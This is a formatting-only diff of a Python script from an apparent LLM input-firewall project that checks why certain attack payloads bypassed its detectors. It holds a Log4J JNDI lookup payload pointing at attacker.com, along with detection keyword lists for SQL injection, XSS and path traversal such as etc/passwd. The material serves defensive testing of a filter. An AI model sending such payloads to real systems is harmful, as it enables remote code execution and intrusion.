@@ -2,10 +2,11 @@
 """
 ANALYZE BYPASSES - WARUM risk=0.00?
 """
+
 import os
 import sys
 
-sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
+sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
 
 from llm_firewall.policy.risk_weights_v2_otb import decide_action_otb
 from llm_firewall.preprocess.context import classify_context
@@ -18,15 +19,15 @@ bypasses = [
     ("Log4J", "${jndi:ldap://attacker.com/exploit}"),
 ]
 
-print("="*70)
+print("=" * 70)
 print("BYPASS ANALYSIS - DETAILLIERT")
-print("="*70)
+print("=" * 70)
 
 for category, payload in bypasses:
-    print(f"\n{'='*70}")
+    print(f"\n{'=' * 70}")
     print(f"CATEGORY: {category}")
     print(f"PAYLOAD: {payload}")
-    print(f"{'='*70}")
+    print(f"{'=' * 70}")
 
     hits, elapsed = run_detectors_timed(payload)
     ctx = classify_context(payload)
@@ -44,10 +45,13 @@ for category, payload in bypasses:
         "SQL": ["secret_patterns", "DROP", "TABLE", "admin"],
         "XSS": ["javascript", "alert", "script"],
         "Path": ["../", "etc/passwd", "path_traversal"],
-        "Log4J": ["jndi", "ldap", "${"]
+        "Log4J": ["jndi", "ldap", "${"],
     }
 
-    missing = [e for e in expected.get(category, []) if not any(e.lower() in h.lower() for h in hits)]
+    missing = [
+        e
+        for e in expected.get(category, [])
+        if not any(e.lower() in h.lower() for h in hits)
+    ]
     if missing:
         print(f"MISSING DETECTIONS: {missing}")
-
